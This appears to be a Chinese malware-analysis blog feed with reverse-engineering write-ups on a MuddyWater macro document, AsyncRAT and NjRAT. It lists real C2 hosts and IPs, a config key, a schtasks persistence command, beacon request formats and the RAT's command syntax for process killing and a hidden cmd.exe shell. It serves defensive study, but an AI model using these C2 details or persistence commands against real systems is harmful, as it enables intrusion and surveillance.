<td style="text-align:left">192.227.147.152<!-- raw HTML omitted -->107.174.68.60</td>
</tr>
</tbody>
</table>
<h2 id="样本分析">样本分析</h2>
<h3 id="文档宏分析">文档宏分析</h3>
<p><code>doc</code>文档中包含了一个<code>VBA</code>脚本，该脚本中存在一些加解密过程，然后会生成<code>C:\ProgramData\Temp_WZW4.txt</code>和<code>%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Temp_WZW4.vbs</code>，当然了两者的内容是一致的：</p>
<p><img src="/muddywater_images/283743213226439.png" alt=""></p>
<h3 id="释放宏分析">释放宏分析</h3>
<p>上述宏可以通过<code>python</code>脚本来还原，获取释放的文件内容（<code>string.txt</code>中存放的是解密密钥和密文）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">strfile</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;string.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">strlist</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">strfile</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">strlist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">keys</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">tempValue</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">appdatapath</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">startpath</span> <span class="o">=</span> <span class="n">strlist</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clearText</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="n">key</span> <span class="o">=</span> <span class="n">keys</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">modifyText</span> <span class="o">=</span> <span class="n">clearText</span><span class="p">(</span><span class="n">tempValue</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pathSave1</span> <span class="o">=</span> <span class="n">clearText</span><span class="p">(</span><span class="n">appdatapath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pathSave2</span> <span class="o">=</span> <span class="n">clearText</span><span class="p">(</span><span class="n">startpath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">modifyText</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pathSave1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pathSave2</span><span class="p">)</span>
</span></span></code></pre></div><p>现在我们获得了一个新的<code>VBScript</code>脚本缓存，根据原始文档宏的要求，替换<code>**</code>为换行符，然后美化一下格式，我们就得到了一个漂亮的<code>Temp_WZW4.vbs</code>，从代码上可以看出字符内容是经过加密的，不过我们可以直接应用作者的代码进行还原：</p>
<p><img src="/muddywater_images/184322914235829.png" alt=""></p>
<p>通过<code>WScript.Echo</code>输出显示，这样我们就能知道<code>C2</code>是：<code>192.227.147.152，107.174.68.60</code>；<code>&amp;l8x8ml=</code>对应的是：<code>&amp;status=</code>；<code>{&quot;&quot;61uuxiwR3lms8&quot;&quot;:</code>对应的是：<code>{&quot;commandResult&quot;:</code></p>
<p>尽管<code>Temp_WZW4.vbs</code>已经很美观了，但为了阅读方便，我对它的函数名和变量名做了重定义，让我们从第一个函数开始看：</p>
<p><img src="/muddywater_images/281532214239274.png" alt=""></p>
<p>这里会和<code>C2</code>进行交互，执行<code>explorer.exe</code>命令，发出以下请求：</p>
<pre tabindex="0"><code>Get ：/getCommand?guid=[uid]
POST：/getTargetInfo?guid=[uid]&amp;status=[statusID]{&#34;commandResult&#34;:[CMD(responseGET)]}
</code></pre><p>命令执行函数会创建一个新的文档用于暂存执行结果<code>c:\ProgramData\AvoU.txt</code>，并在函数结束时返回内容：</p>
<p><img src="/muddywater_images/185053114231583.png" alt=""></p>
<p>由于<code>C2</code>的<code>IP</code>地址有两个，所以存在一个设置<code>C2</code>地址的函数：</p>
<p><img src="/muddywater_images/401123314249463.png" alt=""></p>
<p>随机休眠函数则是如下实现的：</p>
<p><img src="/muddywater_images/451063414247067.png" alt=""></p>
<p><code>GET</code>请求函数如下：</p>
<p><img src="/muddywater_images/265543614244569.png" alt=""></p>
<p><code>POST</code>请求函数如下：</p>
<p><img src="/muddywater_images/96743714225810.png" alt=""></p>
<p>当状态码是<code>126</code>时，会存在一个交互处理函数，当输入<code>1</code>时，会获取<code>OS</code>的相关信息：</p>
<p><img src="/muddywater_images/471374014248250.png" alt=""></p>
<p>获取<code>OS</code>信息的函数如下：</p>
<p><img src="/muddywater_images/290964214243386.png" alt=""></p>
<h2 id="参考资料">参考资料</h2>
<pre tabindex="0"><code>https://attack.mitre.org/groups/G0069/
https://app.any.run/tasks/39a7ba74-e232-42d0-98fe-9063a5be417b/
https://www.virustotal.com/gui/file/ea24c5a8b976919d4c8c4779dc0b7ef887373f126c4732edf9023b827b4e4dc4
https://twitter.com/ShadowChasing1/status/1475819281648553986
</code></pre>]]></content>
		</item>
		
		<item>
			<title>AsyncRAT</title>
			<link>https://www.a1ee.cn/medium/asyncrat/</link>
			<pubDate>Mon, 28 Mar 2022 11:46:12 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/asyncrat/</guid>
			<description>AsyncRat 样本分析 1. 样本信息 AsyncRat是一种远程访问工具 (RAT)，旨在通过安全的加密连接远程监视和控制其他计算机。它是一个开源远程管理工具，</description>
			<content type="html"><![CDATA[<h1 id="asyncrat-样本分析">AsyncRat 样本分析</h1>
<h2 id="1-样本信息">1. 样本信息</h2>
<p><code>AsyncRat</code>是一种远程访问工具 (<code>RAT</code>)，旨在通过安全的加密连接远程监视和控制其他计算机。它是一个开源远程管理工具，因此它也可能被恶意使用，<code>AsyncRat</code>可以通过鱼叉式网络钓鱼、恶意广告、漏洞利用工具包和其他技术等多种方式进行交付。</p>
<p><img src="/asyncrat_images/91031611238191.png" alt=""></p>
<p><strong>ioc</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">特征值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MD5</td>
<td style="text-align:left">0ab8714feb584bd232ed461615d4cfac</td>
</tr>
<tr>
<td style="text-align:left">SHA1</td>
<td style="text-align:left">649e98ae73a023a5892ac0f9eec2988119299e91</td>
</tr>
<tr>
<td style="text-align:left">SHA256</td>
<td style="text-align:left">5da9e7a1817e5ac56efd07be9ce8d943f443707cbcb0d8a22e9b065b451c56dd</td>
</tr>
<tr>
<td style="text-align:left">C2</td>
<td style="text-align:left">money14.ddns.net:5555</td>
</tr>
</tbody>
</table>
<h2 id="2-样本分析">2. 样本分析</h2>
<h3 id="21-自动休眠">2.1. 自动休眠</h3>
<p>恶意程序会根据配置进行休眠：</p>
<p><img src="/asyncrat_images/551935713211269.png" alt=""></p>
<p>当前样本的配置为<code>3s</code>：</p>
<p><img src="/asyncrat_images/591245813229695.png" alt=""></p>
<h3 id="22-初始化设置">2.2. 初始化设置</h3>
<p>恶意程序内存在加密字符串，将通过<code>AES256</code>解密字符串：</p>
<p><img src="/asyncrat_images/390250814217562.png" alt=""></p>
<p>其中关键字符串整理如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Key</td>
<td style="text-align:left">QGjeYaXwfNBH8Fh4Udv9UB6mz2EU1Zvo</td>
</tr>
<tr>
<td style="text-align:left">Ports</td>
<td style="text-align:left">5555</td>
</tr>
<tr>
<td style="text-align:left">Hosts</td>
<td style="text-align:left">money14.ddns.net</td>
</tr>
<tr>
<td style="text-align:left">Version</td>
<td style="text-align:left">0.5.7B</td>
</tr>
<tr>
<td style="text-align:left">Install</td>
<td style="text-align:left">false</td>
</tr>
<tr>
<td style="text-align:left">MTX</td>
<td style="text-align:left">AsyncMutex_6SI8O89Q</td>
</tr>
<tr>
<td style="text-align:left">Pastebin</td>
<td style="text-align:left">null</td>
</tr>
<tr>
<td style="text-align:left">Anti</td>
<td style="text-align:left">false</td>
</tr>
<tr>
<td style="text-align:left">BDOS</td>
<td style="text-align:left">false</td>
</tr>
<tr>
<td style="text-align:left">Group</td>
<td style="text-align:left">Default</td>
</tr>
<tr>
<td style="text-align:left">Hwid</td>
<td style="text-align:left">A3B53DC9D45BCF299437</td>
</tr>
</tbody>
</table>
<p>其中<code>Hwid</code>是由处理器数量，当前用户名，<code>NetBIOS</code>名称，<code>OS</code>版本号及系统卷磁盘大小组成的字符串经过定制的<code>Hash</code>计算得出：</p>
<p><img src="/asyncrat_images/216802114237728.png" alt=""></p>
<p><code>Hash</code>计算函数如下：</p>
<p><img src="/asyncrat_images/414312814230397.png" alt=""></p>
<p>为防止配置字符串被篡改，恶意程序还进行了一次自校验：</p>
<p><img src="/asyncrat_images/282893014226952.png" alt=""></p>
<h3 id="23-创建互斥体">2.3. 创建互斥体</h3>
<p>恶意程序会创建一个名为<code>AsyncMutex_6SI8O89Q</code>的互斥体：</p>
<p><img src="/asyncrat_images/315413314222706.png" alt=""></p>
<h3 id="24-反分析技术">2.4. 反分析技术</h3>
<p>当<code>Anti</code>为<code>true</code>时，将调用<code>Anti_Analysis.RunAntiAnalysis()</code>进行反分析操作，其中包含了：虚拟机检测、调试检测、沙箱检测、磁盘空间检测、<code>XP</code>系统检测，一旦满足其中一条，将终止自身进程：</p>
<p><img src="/asyncrat_images/312873514240586.png" alt=""></p>
<p>恶意程序会在系统制造数据中检测是否包含<code>VIRTUAL</code>、<code>vmware</code>或<code>VirtualBox</code>字段：</p>
<p><img src="/asyncrat_images/201174214238190.png" alt=""></p>
<p>通过<code>NativeMethods.CheckRemoteDebuggerPresent()</code>检测当前进程是否正在被调试：</p>
<p><img src="/asyncrat_images/599814214235692.png" alt=""></p>
<p>通过检测沙箱的动态链接库<code>SbieDll.dll</code>是否存在，判断是否在杀向中运行：</p>
<p><img src="/asyncrat_images/232304514216933.png" alt=""></p>
<p>判断系统卷磁盘大小是否大于<code>61000000000B</code>大约<code>56.8GB</code>：</p>
<p><img src="/asyncrat_images/212821215239373.png" alt=""></p>
<p>判断操作系统是否为<code>xp</code>：</p>
<p><img src="/asyncrat_images/443711415234509.png" alt=""></p>
<h3 id="25-设置自启动">2.5. 设置自启动</h3>
<p>当<code>Install</code>为<code>true</code>时，将执行<code>NormalStartup.Install()</code>函数，将判断当前文件完整路径是否为<code>%AppData%/svchost.exe</code>，如果不是则杀掉进程中的<code>svchost.exe</code>项：</p>
<p><img src="/asyncrat_images/282252815228055.png" alt=""></p>
<p>其中<code>InstallFolder</code>和<code>InstallFile</code>数值如下：</p>
<p><img src="/asyncrat_images/468492915221189.png" alt=""></p>
<p>然后判断当前是否是<code>admin</code>权限，如果是，则调用cmd执行下列命令，添加最高运行等级的开机自启计划任务:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">f</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onlogon</span> <span class="p">/</span><span class="n">rl</span> <span class="n">highest</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;svchost.exe&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s1">&#39;&#34;%AppData%/svchost.exe&#34;&#39;</span> <span class="p">&amp;</span> <span class="n">exit</span>
</span></span></code></pre></div><p><img src="/asyncrat_images/50004315211719.png" alt=""></p>
<p>如果不是<code>admin</code>权限，则修改注册表（<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\</code>）实现开机自启：</p>
<p><img src="/asyncrat_images/18154615214223.png" alt=""></p>
<p>接着会判断<code>%AppData%/svchost.exe</code>是否存在，存在则删除，然后读取当前执行文件字节，写入生成<code>%AppData%/svchost.exe</code>：</p>
<p><img src="/asyncrat_images/209915115223170.png" alt=""></p>
<p>完成自我复制后，如果当前执行权限是<code>admin</code>则通过调用<code>RtlSetProcessIsCritical</code>关闭进程保护，关闭互斥锁，解除<code>SslClient</code>和<code>TcpClient</code>客户端连接：</p>
<p><img src="/asyncrat_images/39515509211270.png" alt=""></p>
<p>然后创建一个临时的<code>.bat</code>文件并向其中写入命令，启动<code>%AppData%/svchost.exe</code>，然后自我删除。当所有指令执行完成后退出：</p>
<p><img src="/asyncrat_images/96960410229696.png" alt=""></p>
<h3 id="26-切换至特殊模式运行">2.6. 切换至特殊模式运行</h3>
<p>调用<code>Process.EnterDebugMode()</code>将进程以特殊模式运行：</p>
<p><img src="/asyncrat_images/470295110217563.png" alt=""></p>
<h3 id="27-构建-socket-通信">2.7. 构建 Socket 通信</h3>
<p>如果<code>Pastebin</code>为<code>null</code>，构建<code>TcpClient</code>连接域名<code>money14.ddns.net</code>，端口<code>5555</code>：</p>
<p><img src="/asyncrat_images/233495410237729.png" alt=""></p>
<p>如果<code>Pastebin</code>不为<code>null</code>，则解析<code>Pastebin</code>结构，连接指定域名端口：</p>
<p><img src="/asyncrat_images/484155910230398.png" alt=""></p>
<p>当成功构建<code>Socket</code>通信连接，将以<code>初始化设置</code>中解密的<code>ServerCertificate</code>证书进行加密通信：</p>
<p><img src="/asyncrat_images/569670211226953.png" alt=""></p>
<p>首先发送的数据报文结构如下：</p>
<p><img src="/asyncrat_images/484470511222707.png" alt=""></p>
<h2 id="3-参考资料">3. 参考资料</h2>
<pre tabindex="0"><code>https://labs.k7computing.com/index.php/github-home-to-asyncrat-backdoor/
https://app.any.run/tasks/51782c07-64b8-4c8c-b5ba-66a04fa2a61e/
https://www.virustotal.com/gui/file/5da9e7a1817e5ac56efd07be9ce8d943f443707cbcb0d8a22e9b065b451c56dd
</code></pre>]]></content>
		</item>
		
		<item>
			<title>NjRat</title>
			<link>https://www.a1ee.cn/medium/njrat/</link>
			<pubDate>Thu, 06 Jan 2022 09:10:58 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/njrat/</guid>
			<description>NjRat 样本分析 1. 样本信息 NjRat (Bladabindi) 是一种 .NET RAT（远程访问木马），允许攻击者控制受感染的机器。 IOC 类别 特征值 MD5 556FE886EDD2DB888EE3A33A103C2364 SHA1 9D58E7B157FE41D86398FF587E10AE2FF3FB3EE9 SHA256 833F86074592648C0A758098E34AB605A2B922D94DBAB7141E2CE87ACEC03C35 C2 44gang44.duckdns.org:2222 2. 样本分析 采用dnSpy加载</description>
			<content type="html"><![CDATA[<h1 id="njrat-样本分析">NjRat 样本分析</h1>
<h2 id="1-样本信息">1. 样本信息</h2>
<p><code>NjRat</code> (<code>Bladabindi</code>) 是一种 <code>.NET</code> <code>RAT</code>（远程访问木马），允许攻击者控制受感染的机器。</p>
<p><img src="/njrat_images/18402611211250.png" alt=""></p>
<p><strong>IOC</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">特征值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MD5</td>
<td style="text-align:left">556FE886EDD2DB888EE3A33A103C2364</td>
</tr>
<tr>
<td style="text-align:left">SHA1</td>
<td style="text-align:left">9D58E7B157FE41D86398FF587E10AE2FF3FB3EE9</td>
</tr>
<tr>
<td style="text-align:left">SHA256</td>
<td style="text-align:left">833F86074592648C0A758098E34AB605A2B922D94DBAB7141E2CE87ACEC03C35</td>
</tr>
<tr>
<td style="text-align:left">C2</td>
<td style="text-align:left">44gang44.duckdns.org:2222</td>
</tr>
</tbody>
</table>
<h2 id="2-样本分析">2. 样本分析</h2>
<p>采用<code>dnSpy</code>加载样本，得知样本原始文件名为：<code>ClassLibrary1.exe</code></p>
<p><img src="/njrat_images/532053111229676.png" alt=""></p>
<h3 id="21-初始命令参数判断">2.1. 初始命令参数判断</h3>
<p>样本执行后，会检查是否存在参数命令，如果参数命令为<code>UP:[ProcessID]</code>，则设置<code>HKEY_CURRENT_USER\di</code>的值为<code>!</code>，关联指定进程并等待<code>5000</code>毫秒后退出；如果参数命令为<code>..</code>，则休眠<code>5000</code>毫秒：</p>
<p><img src="/njrat_images/346784910211251.png" alt=""></p>
<h3 id="22-互斥锁检查">2.2. 互斥锁检查</h3>
<p>打开指定的已命名的互斥体<code>OK.RG</code>(<code>&quot;49e91d08e684b1770e0cefa60401157a&quot;</code>)，如果存在，关闭当前进程，如果不存在，则新建此互斥锁：</p>
<p><img src="/njrat_images/128955610229677.png" alt=""></p>
<p><img src="/njrat_images/299430211217544.png" alt=""></p>
<h3 id="23-准备工作">2.3. 准备工作</h3>
<h4 id="231-检查文件路径">2.3.1. 检查文件路径</h4>
<p>作者定义了一个<code>OK.CompDir</code>函数，将当前执行路径与<code>%AppData%\services64.exe</code>进行比较：</p>
<p><img src="/njrat_images/27884509217554.png" alt=""></p>
<p>如果当前执行的文件不是<code>%AppData%\services64.exe</code>，且存在<code>%AppData%\services64.exe</code>，则将<code>%AppData%\services64.exe</code>删除，然后将自身复制到<code>%AppData%\services64.exe</code>，采用<code>Process.Start</code>启动目标进程，并采用<code>ProjectData.EndApp()</code>关闭当前进程：</p>
<p><img src="/njrat_images/271083210216925.png" alt=""></p>
<p><code>OK.DR</code>与<code>OK.EXE</code>的内容如下：</p>
<p><img src="/njrat_images/423073109229687.png" alt=""></p>
<h4 id="232-关闭附件管理器检查">2.3.2. 关闭附件管理器检查</h4>
<p>在检查完执行路径后，会修改环境变量<code>SEE_MASK_NOZONECHECKS</code>的值为<code>1</code>，已关闭关闭附件管理器检查的弹框提醒：</p>
<p><img src="/njrat_images/11745909237720.png" alt=""></p>
<h4 id="233-修改防火墙规则">2.3.3. 修改防火墙规则</h4>
<p>接着会执行<code>netsh firewall add allowedprogram</code>命令，添加出栈规则：</p>
<p><img src="/njrat_images/141490310230389.png" alt=""></p>
<p>其中<code>OK.LO</code>便是当前执行的文件信息类（<code>FileInfo</code>类）：</p>
<p><img src="/njrat_images/400370910226944.png" alt=""></p>
<h4 id="234-开机自启项">2.3.4. 开机自启项</h4>
<p>在注册表<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>和<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>中，添加<code>49e91d08e684b1770e0cefa60401157a</code>项，指向样本的执行路径（<code>%AppData%\services64.exe</code>）：</p>
<p><img src="/njrat_images/5001310222698.png" alt=""></p>
<p><code>OK.sf</code>与<code>OK.RG</code>的值如下:</p>
<p><img src="/njrat_images/278201810240578.png" alt=""></p>
<p><img src="/njrat_images/500451810238182.png" alt=""></p>
<h4 id="235-文件复制功能">2.3.5. 文件复制功能</h4>
<p>将文件复制到用户的“开始”程序组目录下，并已<code>49e91d08e684b1770e0cefa60401157a.exe</code>命名：</p>
<p><img src="/njrat_images/31652810235684.png" alt=""></p>
<p>注：由于<code>OK.IsF</code>的定义为：<code>public static bool IsF = Conversions.ToBoolean(&quot;False&quot;);</code>，故该功能未执行！</p>
<h3 id="24-网络通信">2.4. 网络通信</h3>
<p>准备工作结束后，将多线程执行<code>OK.RC</code>函数：</p>
<p><img src="/njrat_images/85163410239365.png" alt=""></p>
<h4 id="241-连接c2">2.4.1. 连接C2</h4>
<p>该函数用于<code>TCP</code>网络通信连接，其中存在一个<code>OK.connect</code>函数，用于同<code>C2</code>（<code>44gang44.duckdns.org:2222</code>）连接，并发送关于主机的相关信息（<code>OK.inf()</code>返回内容）：</p>
<p><img src="/njrat_images/163664410234501.png" alt=""></p>
<p><code>OK.H</code>与<code>OK.P</code>的值如下：</p>
<p><img src="/njrat_images/408534410228047.png" alt=""></p>
<h4 id="242-发送本地主机信息">2.4.2. 发送本地主机信息</h4>
<p>发送的内容是已<code>lv</code>开头，已<code>|'|'|</code>分割的字符串（<code>OK.Y</code>的定义为<code>public static string Y = &quot;|'|'|&quot;;</code>）。</p>
<p><strong>获取系统磁盘序号</strong></p>
<p>首先检索注册表<code>HKEY_CURRENT_USER\Software\49e91d08e684b1770e0cefa60401157a\vn</code>的值是否为空，再通过<code>OK.HWD()</code>获取信息，然后将<code>OK.VN</code>与信息拼接起来再通过<code>OK.ENB()</code>编码：</p>
<p><img src="/njrat_images/352070711221181.png" alt=""></p>
<p>其中<code>OK.VN</code>的定义是：<code>c3BsaXRnYXRldWtyYXluYQ==</code>，通过<code>Base64</code>解码得到的字符串是：<code>splitgateukrayna</code>（分裂门乌克兰）不知道这是不是组织的标签。</p>
<p><code>OK.HWD()</code>将首先获取当前系统磁盘符，然后通过<code>GetVolumeInformation</code>获取磁盘序号：</p>
<p><img src="/njrat_images/153143511211711.png" alt=""></p>
<p><strong>获取主机名和用户名</strong></p>
<p>通过调用系统<code>API</code>：<code>Environment.MachineName</code>、<code>Environment.UserName</code>，获取此本地计算机的 NetBIOS 名称和当前线程相关联的用户的用户名：</p>
<p><img src="/njrat_images/118024411214215.png" alt=""></p>
<p><strong>获取文件最后一次修改时间</strong></p>
<p>然后将调用<code>OK.FR()</code>获取上次修改当前文件的时间：</p>
<p><img src="/njrat_images/202434811223162.png" alt=""></p>
<p><strong>获取操作系统名称</strong></p>
<p>从<code>My.Computer.Info.OSFullName</code>属性中获取完整的操作系统名称：</p>
<p><img src="/njrat_images/504005514211261.png" alt=""></p>
<p><strong>获取操作系统 ServicePack 版本</strong></p>
<p>从<code>Environment.OSVersion</code>属性中获取<code>ServicePack</code>版本：</p>
<p><img src="/njrat_images/9980015229687.png" alt=""></p>
<p><strong>判断操作系统版本</strong></p>
<p>通过检索<code>x86 Program Files</code>文件夹（<code>Program Files (x86)</code>）是否存在，判断操作系统版本并记录：</p>
<p><img src="/njrat_images/497980615217554.png" alt=""></p>
<p><strong>判断摄像头是否存在</strong></p>
<p>调用<code>Ok.Cam()</code>，判断是否存在摄像头：</p>
<p><img src="/njrat_images/537180715237720.png" alt=""></p>
<p><code>Ok.Cam()</code>中调用了<code>Win32API</code>：<code>capGetDriverDescriptionA</code>，检索捕获驱动程序的版本说明，成功则返回<code>TRUE</code>，否则返回<code>FALSE</code>：</p>
<p><img src="/njrat_images/255500915230389.png" alt=""></p>
<p><strong>获取当前窗口信息</strong></p>
<p>调用<code>OK.ACT()</code>函数，获取当前窗口的相关信息，并采用<code>OK.ENB</code>进行<code>Base64</code>编码，<code>API</code>调用如下：</p>
<ul>
<li>调用<code>GetForegroundWindow()</code>，检索前景窗口（用户当前正在使用的窗口）的句柄；</li>
<li>调用<code>GetWindowTextLength()</code>，检索指定窗口标题栏文本的长度；</li>
<li>调用<code>GetWindowText()</code>，将指定窗口标题栏的文本复制到缓冲区中；</li>
<li>调用<code>GetWindowThreadProcessId()</code>，检索创建指定窗口的线程的标识符，以及创建该窗口的进程的标识符；</li>
<li>调用<code>Process.GetProcessById().MainWindowTitle</code>，获取进程主窗口的标题；</li>
</ul>
<p><img src="/njrat_images/254663715226944.png" alt=""></p>
<p><strong>创建注册表项</strong></p>
<p>样本会创建<code>HKEY_CURRENT_USER\Software\49e91d08e684b1770e0cefa60401157a</code></p>
<p><img src="/njrat_images/551502016222698.png" alt=""></p>
<h4 id="243-响应内容处理">2.4.3. 响应内容处理</h4>
<p>样本采用<code>Receive</code>将响应的内容存储到本地缓冲区，其长度为<code>5121</code>字节（<code>private static byte[] b = new byte[5121];</code>）</p>
<p><img src="/njrat_images/100580417216925.png" alt=""></p>
<p>创建新的线程执行<code>OK.Ind</code>以处理提取的响应命令（该部分将放在后面的命令解析中进行说明）：</p>
<p><img src="/njrat_images/246810917234501.png" alt=""></p>
<h3 id="25-键盘监控">2.5. 键盘监控</h3>
<p>新建一个<code>kl</code>类，用于存储键盘记录相关的信息：</p>
<p><img src="/njrat_images/292755616238182.png" alt=""></p>
<p>然后创建线程执行<code>WRK()</code>函数：</p>
<p><img src="/njrat_images/58585516240578.png" alt=""></p>
<p>使用<code>File.ReadAllText()</code>读取日志文件，然后进行按键捕获，最终通过<code>File.WriteAllText()</code>写入日志到当前路径下的<code>services64.exe.tmp</code>中：</p>
<p><img src="/njrat_images/365555716235684.png" alt=""></p>
<p>调用<code>GetAsyncKeyState()</code>检测键盘是否被按下，然后调用<code>this.Fix()</code>捕获按键内容，特殊及组合按键的捕获方式如下：</p>
<p><img src="/njrat_images/366310810211262.png" alt=""></p>
<p>普通按键的的捕获则是通过来<code>kl.VKCodeToUnicode()</code>实现的：</p>
<p><img src="/njrat_images/273741310229688.png" alt=""></p>
<p><code>kl.VKCodeToUnicode()</code>中使用<code>GetKeyboardState()</code>将256个虚拟键的状态复制到指定的缓冲区，然后通过<code>MapVirtualKey()</code>将虚拟键代码转换（映射）为扫描代码或字符值，再使用<code>GetKeyboardLayout()</code>检索活动输入区域的键盘布局，最后调用<code>ToUnicodeEx()</code>将指定的虚拟键代码和键盘状态转换为相应的 Unicode 字符：</p>
<p><img src="/njrat_images/584851410217555.png" alt=""></p>
<p>调用<code>this.AV()</code>，将获取的信息整合起来，准备写入到日志中去：</p>
<p><img src="/njrat_images/491632910237721.png" alt=""></p>
<h3 id="26-命令解析">2.6. 命令解析</h3>
<p>在<code>OK.Ind</code>函数中，会对响应内容进行分割，其中分割符<code>OK.Y</code>的值为<code>|'|'|</code>，这为命令的下发组合的反推提供了依据：</p>
<p><img src="/njrat_images/22665510230390.png" alt=""></p>
<h4 id="261-proc-命令">2.6.1. proc 命令</h4>
<p><strong>当命令组合为：<code>proc|'|'|~</code>时</strong></p>
<p>将发送当前活动进程的<code>Id</code>及数量到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/434665810226945.png" alt=""></p>
<p>采用<code>process.MainModule.FileVersionInfo.FileDescription</code>获取进程描述代码后进行<code>Base64</code>编码，然后构造成包含进程ID、完整进程路径、编码描述代码的字符串：</p>
<p><img src="/njrat_images/538301311222699.png" alt=""></p>
<p>对于<code>Windows</code>系统进程处理略有不同：</p>
<p><img src="/njrat_images/40071911240579.png" alt=""></p>
<p>最后将收集到的信息发送到<code>C2</code>服务器：</p>
<p><img src="/njrat_images/337912011238183.png" alt=""></p>
<p><strong>当命令组合为：<code>proc|'|'|k|'|'|&lt;ProcessID&gt;..</code>时</strong></p>
<p>当采用了<code>k</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，杀死进程，每次执行后都将反馈结果至<code>C2</code>服务器：</p>
<p><img src="/njrat_images/354302211235685.png" alt=""></p>
<p><strong>当命令组合为：<code>proc|'|'|kd|'|'|&lt;ProcessID&gt;..</code>时</strong></p>
<p>当采用了<code>kd</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，杀死进程并删除进程文件，每次执行后都将反馈结果至<code>C2</code>服务器（彩蛋：这里<code>Delete</code>后作者的标识依然是<code>ER</code> -.-!）：</p>
<p><img src="/njrat_images/253812911216926.png" alt=""></p>
<p><strong>当命令组合为：<code>proc|'|'|re|'|'|&lt;ProcessID&gt;..</code>时</strong></p>
<p>当采用了<code>re</code>子命令时，将循环检索<code>&lt;ProcessID&gt;</code>，重启进程，每次执行后都将反馈结果至<code>C2</code>服务器：</p>
<p><img src="/njrat_images/472993411239366.png" alt=""></p>
<h4 id="262-rss-命令">2.6.2. rss 命令</h4>
<p><strong>当命令组合为：<code>rss|'|'|</code>时</strong></p>
<p>新建一个<code>ProcessStartInfo</code>类并启动，该类的作用是附加一个子进程到当前进程，其中进行了如下配置：</p>
<ol>
<li>设置<code>RedirectStandardInput</code>属性为<code>true</code>，应用程序的输入是从<code>StandardInput</code>流中读取的值；</li>
<li>设置<code>RedirectStandardOutput</code>属性为<code>true</code>，将应用程序的文本输出写入<code>StandardOutput</code>流中的值；</li>
<li>设置<code>RedirectStandardError</code>属性为<code>true</code>，将应用程序的错误输出写入<code>StandardError</code>流中的值；</li>
<li>设置子进程名为<code>cmd.exe</code>；</li>
<li>指定<code>OK.RS()</code>处理<code>OutputDataReceived</code>（输出）和<code>ErrorDataReceived</code>（报错）事件；</li>
<li>指定<code>OK.ex()</code>处理<code>Exited</code>（退出）事件；</li>
<li>设置<code>UseShellExecute</code> 设置为<code>false</code> ，表示子进程将继承调用进程的标准输入、标准输出和标准错误流；</li>
<li>设置<code>CreateNoWindow</code>属性为<code>true</code>，表示启动子进程而不创建包含它的新窗口；</li>
<li>设置启动进程时使用的窗口状态为<code>Hidden</code>（隐藏）；</li>
